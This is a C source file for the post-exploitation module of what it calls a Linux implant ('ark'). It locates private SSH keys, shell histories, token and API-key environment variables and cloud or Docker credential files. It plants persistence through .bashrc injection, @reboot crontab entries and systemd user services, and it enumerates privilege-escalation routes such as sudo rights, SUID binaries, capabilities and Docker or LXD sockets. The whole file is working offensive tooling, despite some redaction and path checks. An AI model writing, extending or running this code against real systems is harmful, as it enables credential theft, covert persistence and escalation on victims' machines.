/*
 * Linux-native creds / persist / privesc-enum for the C implant.
 * Host tests compile this file with fixture env (ARK_HOME, ARK_CRON_FILE, …).
 */
#include <ctype.h>
#include <dirent.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

#include "ark/linux_postex.h"
#include "ark/pathjail.h"

#define CRED_MAX ARK_LINUX_CRED_MAX

const char *ark_linux_home(void) {
    const char *h = getenv("ARK_HOME");
    if (h && h[0]) return h;
    h = getenv("HOME");
    return (h && h[0]) ? h : "";
}

static void copy_str(char *dst, size_t cap, const char *src) {
    if (!dst || cap == 0) return;
    if (!src) {
        dst[0] = '\0';
        return;
    }
    strncpy(dst, src, cap - 1);
    dst[cap - 1] = '\0';
}

static int fmt_ok(int n, size_t cap) {
    return n >= 0 && (size_t)n < cap;
}

static int add_cred(ark_credential *out, size_t cap, size_t *n,
    const char *type, const char *source, const char *value) {
    if (!out || !n || *n >= cap) return 0;
    ark_credential *c = &out[(*n)++];
    memset(c, 0, sizeof(*c));
    copy_str(c->type, sizeof(c->type), type);
    copy_str(c->source, sizeof(c->source), source);
    copy_str(c->value, sizeof(c->value), value);
    return 1;
}

void ark_linux_redact_secrets(char *s) {
    if (!s) return;
    static const char *keys[] = {
        "password=", "passwd=", "secret=", "token=", "aws_secret_access_key=", NULL
    };
    for (char *p = s; *p; p++) {
        for (int k = 0; keys[k]; k++) {
            size_t n = strlen(keys[k]);
            if (strncasecmp(p, keys[k], n) != 0) continue;
            char *v = p + n;
            while (*v && !isspace((unsigned char)*v) && *v != '"' && *v != '\'') {
                *v++ = '*';
            }
            p = v;
            if (!*p) return;
            break;
        }
    }
}

int ark_linux_payload_allowed(const char *path) {
    if (!path || !path[0]) return 0;
    if (ark_path_has_dotdot_escape(path)) return 0;
    if (strncmp(path, "/etc", 4) == 0 && (path[4] == '/' || path[4] == '\0')) return 0;
    if (strncmp(path, "/lib", 4) == 0 && (path[4] == '/' || path[4] == '\0')) return 0;
    if (strncmp(path, "/usr/lib", 8) == 0 && (path[8] == '/' || path[8] == '\0')) return 0;
    return 1;
}

static int read_first_line(const char *path, char *line, size_t cap) {
    FILE *f = fopen(path, "r");
    if (!f) return 0;
    if (!fgets(line, (int)cap, f)) {
        line[0] = '\0';
        fclose(f);
        return 0;
    }
    size_t n = strlen(line);
    while (n > 0 && (line[n - 1] == '\n' || line[n - 1] == '\r')) line[--n] = '\0';
    fclose(f);
    return 1;
}

static const char *key_kind(const char *first) {
    if (strstr(first, "OPENSSH PRIVATE KEY")) return "OPENSSH PRIVATE KEY (ref)";
    if (strstr(first, "RSA PRIVATE KEY")) return "RSA PRIVATE KEY (ref)";
    if (strstr(first, "EC PRIVATE KEY")) return "EC PRIVATE KEY (ref)";
    if (strstr(first, "PRIVATE KEY")) return "PRIVATE KEY (ref)";
    return "key file (ref)";
}

static int collect_ssh_keys(const char *home, ark_credential *out, size_t cap, size_t *n) {
    char dir[ARK_MOD_PATH_MAX];
    if (!fmt_ok(snprintf(dir, sizeof(dir), "%s/.ssh", home), sizeof(dir))) return 1;
    DIR *d = opendir(dir);
    if (!d) return 1;
    struct dirent *ent;
    while ((ent = readdir(d)) != NULL) {
        if (ent->d_name[0] == '.') continue;
        if (strstr(ent->d_name, ".pub")) continue;
        if (strcmp(ent->d_name, "known_hosts") == 0 ||
            strcmp(ent->d_name, "authorized_keys") == 0 ||
            strcmp(ent->d_name, "config") == 0 ||
            strcmp(ent->d_name, "known_hosts.old") == 0)
            continue;
        char path[ARK_MOD_PATH_MAX];
        if (!fmt_ok(snprintf(path, sizeof(path), "%s/%s", dir, ent->d_name), sizeof(path)))
            continue;
        struct stat st;
        if (stat(path, &st) != 0 || !S_ISREG(st.st_mode)) continue;
        char first[128];
        if (!read_first_line(path, first, sizeof(first))) continue;
        if (!strstr(first, "PRIVATE KEY") && strncmp(first, "-----BEGIN", 10) != 0) continue;
        add_cred(out, cap, n, "ssh_key", path, key_kind(first));
    }
    closedir(d);
    return 1;
}

static int collect_history(const char *home, ark_credential *out, size_t cap, size_t *n) {
    static const char *names[] = {
        ".bash_history", ".zsh_history", ".python_history", NULL
    };
    for (int i = 0; names[i]; i++) {
        char path[ARK_MOD_PATH_MAX];
        if (!fmt_ok(snprintf(path, sizeof(path), "%s/%s", home, names[i]), sizeof(path)))
            continue;
        FILE *f = fopen(path, "r");
        if (!f) continue;
        if (fseek(f, 0, SEEK_END) != 0) { fclose(f); continue; }
        long sz = ftell(f);
        if (sz < 0) { fclose(f); continue; }
        const long capn = 4096;
        long start = sz > capn ? sz - capn : 0;
        if (fseek(f, start, SEEK_SET) != 0) { fclose(f); continue; }
        char buf[4097];
        size_t got = fread(buf, 1, sizeof(buf) - 1, f);
        fclose(f);
        buf[got] = '\0';
        ark_linux_redact_secrets(buf);
        char summary[512];
        snprintf(summary, sizeof(summary), "last %zu bytes (redacted)", got);
        add_cred(out, cap, n, "history", path, summary);
    }
    return 1;
}

static int env_interesting(const char *name) {
    static const char *pref[] = {
        "AWS_", "GITHUB_TOKEN", "GH_TOKEN", "SSH_AUTH_SOCK", "KUBECONFIG",
        "PGPASSWORD", "NPM_TOKEN", "HF_TOKEN", "OPENAI_API_KEY",
        "ANTHROPIC_API_KEY", "XAI_API_KEY", NULL
    };
    for (int i = 0; pref[i]; i++) {
        if (strncmp(name, pref[i], strlen(pref[i])) == 0) return 1;
    }
    return 0;
}

static int collect_env(ark_credential *out, size_t cap, size_t *n) {
    extern char **environ;
    if (!environ) return 1;
    for (char **e = environ; *e; e++) {
        const char *eq = strchr(*e, '=');
        if (!eq) continue;
        size_t nl = (size_t)(eq - *e);
        char name[128];
        if (nl >= sizeof(name)) continue;
        memcpy(name, *e, nl);
        name[nl] = '\0';
        if (!env_interesting(name)) continue;
        add_cred(out, cap, n, "env", name, "(set)");
    }
    return 1;
}

static int collect_files(const char *home, ark_credential *out, size_t cap, size_t *n) {
    static const char *rel[] = {
        ".aws/credentials", ".netrc", ".docker/config.json", NULL
    };
    for (int i = 0; rel[i]; i++) {
        char path[ARK_MOD_PATH_MAX];
        if (!fmt_ok(snprintf(path, sizeof(path), "%s/%s", home, rel[i]), sizeof(path)))
            continue;
        if (access(path, R_OK) == 0)
            add_cred(out, cap, n, "file", path, "readable");
        else if (access(path, F_OK) == 0)
            add_cred(out, cap, n, "file", path, "exists (not readable)");
    }
    return 1;
}

int ark_linux_creds_collect(const char *method, const char *home,
    ark_credential *out, size_t cap, size_t *n) {
    if (!method || !out || !n) return 0;
    *n = 0;
    if (!home) home = ark_linux_home();
    if (strcmp(method, "ssh_keys") == 0) return collect_ssh_keys(home, out, cap, n);
    if (strcmp(method, "history") == 0) return collect_history(home, out, cap, n);
    if (strcmp(method, "env") == 0) return collect_env(out, cap, n);
    if (strcmp(method, "files") == 0) return collect_files(home, out, cap, n);
    if (strcmp(method, "all") == 0) {
        collect_ssh_keys(home, out, cap, n);
        collect_history(home, out, cap, n);
        collect_env(out, cap, n);
        collect_files(home, out, cap, n);
        return 1;
    }
    return 0;
}

static int read_file_all(const char *path, char **buf, size_t *len) {
    *buf = NULL;
    *len = 0;
    FILE *f = fopen(path, "r");
    if (!f) return errno == ENOENT ? 1 : 0;
    if (fseek(f, 0, SEEK_END) != 0) { fclose(f); return 0; }
    long sz = ftell(f);
    if (sz < 0) { fclose(f); return 0; }
    if (fseek(f, 0, SEEK_SET) != 0) { fclose(f); return 0; }
    *buf = (char *)malloc((size_t)sz + 1);
    if (!*buf) { fclose(f); return 0; }
    size_t got = fread(*buf, 1, (size_t)sz, f);
    fclose(f);
    (*buf)[got] = '\0';
    *len = got;
    return 1;
}

static int write_file_all(const char *path, const char *buf) {
    FILE *f = fopen(path, "w");
    if (!f) return 0;
    if (buf && buf[0] && fputs(buf, f) == EOF) { fclose(f); return 0; }
    fclose(f);
    return 1;
}

static void persist_markers(const char *name, char *begin, size_t bc, char *end, size_t ec) {
    if (!fmt_ok(snprintf(begin, bc, "# ark-persist-begin %s", name), bc))
        begin[0] = '\0';
    if (!fmt_ok(snprintf(end, ec, "# ark-persist-end %s", name), ec))
        end[0] = '\0';
}

static int persist_bashrc(const ark_persist_config *cfg, const char *home,
    int remove, char *details, size_t details_cap) {
    char path[ARK_MOD_PATH_MAX];
    if (!fmt_ok(snprintf(path, sizeof(path), "%s/.bashrc", home), sizeof(path))) {
        snprintf(details, details_cap, "home path too long");
        return 0;
    }
    const char *name = cfg->name[0] ? cfg->name : "ark";
    char begin[128], end[128];
    persist_markers(name, begin, sizeof(begin), end, sizeof(end));
    if (!begin[0] || !end[0]) {
        snprintf(details, details_cap, "persist name too long");
        return 0;
    }
    char *old = NULL;
    size_t old_len = 0;
    if (!read_file_all(path, &old, &old_len)) return 0;
    if (!old) {
        old = strdup("");
        if (!old) return 0;
    }
    size_t add = 0;
    if (!remove)
        add = strlen(begin) + strlen(end) + strlen(cfg->payload_path) + 8;
    char *out = (char *)malloc(old_len + add + 1);
    if (!out) { free(old); return 0; }
    out[0] = '\0';
    size_t used = 0;
    char *p = old;
    while (*p) {
        char *line = p;
        char *nl = strchr(p, '\n');
        size_t llen = nl ? (size_t)(nl - p) + 1 : strlen(p);
        if (strncmp(line, begin, strlen(begin)) == 0) {
            char *e = strstr(line, end);
            if (e) {
                char *after = strchr(e, '\n');
                p = after ? after + 1 : e + strlen(e);
                continue;
            }
        }
        memcpy(out + used, line, llen);
        used += llen;
        out[used] = '\0';
        p += llen;
    }
    if (!remove) {
        if (!ark_linux_payload_allowed(cfg->payload_path)) {
            free(old); free(out);
            snprintf(details, details_cap, "payload_path refused");
            return 0;
        }
        used += (size_t)snprintf(out + used, old_len + add + 1 - used,
            "%s\n%s\n%s\n", begin, cfg->payload_path, end);
        (void)used;
    }
    int ok = write_file_all(path, out);
    free(old);
    free(out);
    snprintf(details, details_cap, "%s %s", remove ? "removed" : "added", path);
    return ok;
}

static const char *cron_path(void) {
    const char *p = getenv("ARK_CRON_FILE");
    return (p && p[0]) ? p : NULL;
}

static int persist_cron(const ark_persist_config *cfg, int remove,
    char *details, size_t details_cap) {
    const char *name = cfg->name[0] ? cfg->name : "ark";
    char tag[160];
    if (!fmt_ok(snprintf(tag, sizeof(tag), "# ark:%s", name), sizeof(tag))) {
        snprintf(details, details_cap, "persist name too long");
        return 0;
    }
    char *old = NULL;
    size_t old_len = 0;
    const char *file = cron_path();
    if (file) {
        if (!read_file_all(file, &old, &old_len)) return 0;
    } else {
        FILE *fp = popen("crontab -l 2>/dev/null", "r");
        if (!fp) {
            old = strdup("");
        } else {
            char buf[8192];
            size_t n = fread(buf, 1, sizeof(buf) - 1, fp);
            buf[n] = '\0';
            pclose(fp);
            old = strdup(buf);
        }
        if (!old) return 0;
    }
    if (!old) {
        old = strdup("");
        if (!old) return 0;
    }
    size_t oldn = strlen(old);
    size_t add = 0;
    if (!remove)
        add = strlen(cfg->payload_path) + strlen(tag) + 16;
    char *out = (char *)malloc(oldn + add + 1);
    if (!out) { free(old); return 0; }
    out[0] = '\0';
    size_t used = 0;
    char *p = old;
    while (*p) {
        char *nl = strchr(p, '\n');
        size_t llen = nl ? (size_t)(nl - p) + 1 : strlen(p);
        char saved = p[llen];
        p[llen] = '\0';
        int skip = strstr(p, tag) != NULL;
        p[llen] = saved;
        if (!skip) {
            memcpy(out + used, p, llen);
            used += llen;
            out[used] = '\0';
        }
        p += llen;
    }
    if (!remove) {
        if (!ark_linux_payload_allowed(cfg->payload_path)) {
            free(old); free(out);
            snprintf(details, details_cap, "payload_path refused");
            return 0;
        }
        used += (size_t)snprintf(out + used, oldn + add + 1 - used,
            "@reboot %s %s\n", cfg->payload_path, tag);
        (void)used;
    }
    int ok = 0;
    if (file) {
        ok = write_file_all(file, out);
    } else {
        FILE *wp = popen("crontab -", "w");
        if (wp) {
            fputs(out, wp);
            ok = pclose(wp) == 0;
        }
    }
    free(old);
    free(out);
    snprintf(details, details_cap, "%s cron %s", remove ? "removed" : "added", name);
    return ok;
}

static int persist_name_ok(const char *name) {
    if (!name || !name[0] || strlen(name) > 64) return 0;
    for (const char *p = name; *p; p++) {
        if (isalnum((unsigned char)*p) || *p == '.' || *p == '_' || *p == '-')
            continue;
        return 0;
    }
    return 1;
}

static int mkdir_p(const char *dir) {
    char buf[ARK_MOD_PATH_MAX];
    if (!dir || !dir[0] || strlen(dir) >= sizeof(buf)) return 0;
    copy_str(buf, sizeof(buf), dir);
    for (char *p = buf + 1; *p; p++) {
        if (*p != '/') continue;
        *p = '\0';
        if (mkdir(buf, 0700) != 0 && errno != EEXIST) return 0;
        *p = '/';
    }
    if (mkdir(buf, 0700) != 0 && errno != EEXIST) return 0;
    return 1;
}

static int persist_systemd(const ark_persist_config *cfg, const char *home,
    int remove, char *details, size_t details_cap) {
    const char *name = cfg->name[0] ? cfg->name : "ark";
    char dir[ARK_MOD_PATH_MAX];
    const char *override = getenv("ARK_SYSTEMD_USER_DIR");
    if (override && override[0]) {
        if (!fmt_ok(snprintf(dir, sizeof(dir), "%s", override), sizeof(dir))) {
            snprintf(details, details_cap, "systemd dir too long");
            return 0;
        }
    } else {
        if (!fmt_ok(snprintf(dir, sizeof(dir), "%s/.config/systemd/user", home), sizeof(dir))) {
            snprintf(details, details_cap, "home path too long");
            return 0;
        }
    }
    char unit[ARK_MOD_PATH_MAX];
    if (!fmt_ok(snprintf(unit, sizeof(unit), "%s/%s.service", dir, name), sizeof(unit))) {
        snprintf(details, details_cap, "unit path too long");
        return 0;
    }
    if (remove) {
        unlink(unit);
        snprintf(details, details_cap, "removed %s", unit);
        return 1;
    }
    if (!ark_linux_payload_allowed(cfg->payload_path)) {
        snprintf(details, details_cap, "payload_path refused");
        return 0;
    }
    if (!persist_name_ok(name)) {
        snprintf(details, details_cap, "persist name refused");
        return 0;
    }
    if (!mkdir_p(dir)) {
        snprintf(details, details_cap, "mkdir %s failed", dir);
        return 0;
    }
    FILE *f = fopen(unit, "w");
    if (!f) {
        snprintf(details, details_cap, "open %s failed", unit);
        return 0;
    }
    fprintf(f,
        "[Unit]\nDescription=ark user persist\n\n"
        "[Service]\nType=simple\nExecStart=%s\nRestart=on-failure\n\n"
        "[Install]\nWantedBy=default.target\n",
        cfg->payload_path);
    fclose(f);
    snprintf(details, details_cap, "wrote %s (enable with: systemctl --user enable --now %s.service)", unit, name);
    return 1;
}

int ark_linux_persist_apply(const ark_persist_config *cfg, const char *home,
    char *details, size_t details_cap) {
    if (!cfg || !details || details_cap == 0) return 0;
    details[0] = '\0';
    if (!home) home = ark_linux_home();
    int remove = (strcmp(cfg->trigger, "remove") == 0 || strcmp(cfg->trigger, "clear") == 0);
    if (strcmp(cfg->method, "bashrc") == 0)
        return persist_bashrc(cfg, home, remove, details, details_cap);
    if (strcmp(cfg->method, "cron") == 0)
        return persist_cron(cfg, remove, details, details_cap);
    if (strcmp(cfg->method, "systemd_user") == 0)
        return persist_systemd(cfg, home, remove, details, details_cap);
    snprintf(details, details_cap, "unknown persist method");
    return 0;
}

static int append_line(char *out, size_t cap, const char *line) {
    size_t have = strlen(out);
    size_t need = strlen(line);
    if (have + need + 2 >= cap) return 0;
    memcpy(out + have, line, need);
    out[have + need] = '\n';
    out[have + need + 1] = '\0';
    return 1;
}

static void scan_suid(const char *root, char *out, size_t cap, int *count, int maxn, int *dirs, int maxdirs) {
    if (*count >= maxn || *dirs >= maxdirs) return;
    DIR *d = opendir(root);
    if (!d) return;
    (*dirs)++;
    struct dirent *ent;
    while ((ent = readdir(d)) != NULL && *count < maxn) {
        if (ent->d_name[0] == '.' &&
            (ent->d_name[1] == '\0' || (ent->d_name[1] == '.' && ent->d_name[2] == '\0')))
            continue;
        char path[ARK_MOD_PATH_MAX];
        if (!fmt_ok(snprintf(path, sizeof(path), "%s/%s", root, ent->d_name), sizeof(path)))
            continue;
        struct stat st;
        if (lstat(path, &st) != 0) continue;
        if (S_ISDIR(st.st_mode) && !S_ISLNK(st.st_mode)) {
            scan_suid(path, out, cap, count, maxn, dirs, maxdirs);
            continue;
        }
        if ((st.st_mode & S_ISUID) || (st.st_mode & S_ISGID)) {
            char line[ARK_MOD_PATH_MAX + 32];
            snprintf(line, sizeof(line), "suid %04o %s", (unsigned)(st.st_mode & 07777), path);
            if (append_line(out, cap, line)) (*count)++;
        }
    }
    closedir(d);
}

int ark_linux_privesc_enum(char *out, size_t out_cap) {
    if (!out || out_cap < 8) return 0;
    out[0] = '\0';
    append_line(out, out_cap, "privesc enum");

    FILE *sp = popen("sudo -n -l 2>&1", "r");
    if (sp) {
        char buf[1024];
        size_t n = fread(buf, 1, sizeof(buf) - 1, sp);
        buf[n] = '\0';
        int st = pclose(sp);
        ark_linux_redact_secrets(buf);
        if (st != 0 && (strstr(buf, "password") || strstr(buf, "a terminal is required")))
            append_line(out, out_cap, "sudo: needs tty or password");
        else {
            append_line(out, out_cap, "sudo -n -l:");
            /* first 400 chars */
            if (n > 400) buf[400] = '\0';
            append_line(out, out_cap, buf);
        }
    } else {
        append_line(out, out_cap, "sudo: not available");
    }

    const char *roots = getenv("ARK_PRIVESC_ROOTS");
    char rootbuf[512];
    if (!roots || !roots[0]) roots = "/usr/bin:/bin:/sbin:/opt";
    copy_str(rootbuf, sizeof(rootbuf), roots);
    int count = 0, dirs = 0;
    char *save = NULL;
    for (char *tok = strtok_r(rootbuf, ":", &save); tok; tok = strtok_r(NULL, ":", &save))
        scan_suid(tok, out, out_cap, &count, 32, &dirs, 256);

    if (access("/usr/sbin/getcap", X_OK) == 0 || access("/sbin/getcap", X_OK) == 0) {
        FILE *gp = popen("getcap -r /usr /bin /sbin /opt 2>/dev/null | head -n 20", "r");
        if (gp) {
            char line[256];
            int gc = 0;
            while (fgets(line, sizeof(line), gp) && gc < 20) {
                size_t L = strlen(line);
                while (L > 0 && (line[L - 1] == '\n' || line[L - 1] == '\r')) line[--L] = '\0';
                append_line(out, out_cap, line);
                gc++;
            }
            pclose(gp);
        }
    }

    if (access("/var/run/docker.sock", F_OK) == 0)
        append_line(out, out_cap, "socket /var/run/docker.sock");
    if (access("/var/lib/lxd/unix.socket", F_OK) == 0 ||
        access("/var/snap/lxd/common/lxd/unix.socket", F_OK) == 0)
        append_line(out, out_cap, "socket lxd");
    return 1;
}
